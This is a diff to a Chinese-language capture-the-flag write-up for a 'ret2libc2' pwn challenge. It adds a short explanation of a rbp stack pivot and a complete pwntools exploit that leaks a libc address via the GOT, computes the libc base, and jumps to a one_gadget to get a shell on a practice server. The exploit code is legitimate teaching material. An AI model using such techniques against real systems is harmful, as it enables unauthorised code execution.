@@ -86,4 +86,45 @@ one_gadget类型的题目。
 ![[Pasted image 20250302223055.png]]
 泄漏之后可以算出libc基址，查找使用哪个gadget
 ![[Pasted image 20250302223226.png]]
-可以发现都需要rbp-0xXX可以执行，
+可以发现都需要rbp-0xXX可以执行，可以看到有leave ret，将rbp迁移到一个可执行的位置即可。
+```python
+from pwn import *
+from wstube import websocket
+
+context(arch='amd64', os='linux', log_level='debug')
+local = True
+ip = 'node2.anna.nssctf.cn'
+port = 28713
+if local:
+	p = process('./ret2libc2')
+	pwnlib.gdb.attach(p, 'b func')
+else:
+	p = remote(ip, port)
+	# p = websocket()
+
+elf = ELF('./ret2libc2')
+libc = ELF('./libc.so.6')
+ret = 0x40101a
+
+p.recvuntil(b'magic')
+payload = p64(elf.got['puts']) + b'\x00' * 0x28 + p64(elf.got['setvbuf'] + 0x10) + p64(0x401223)
+p.send(payload)
+
+p.recvuntil(b'\n')
+puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
+log.success('puts_addr: ' + hex(puts_addr))
+libc_base = puts_addr - libc.symbols['setvbuf']
+log.success('libc_base: ' + hex(libc_base))
+
+system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
+
+ogg = libc_base + 0xebc81
+
+p.recvuntil(b'magic')
+payload = b'\x00' * (0x30) + p64(elf.bss() + 0x100) + p64(ogg)
+
+p.send(payload)
+
+p.interactive()
+```
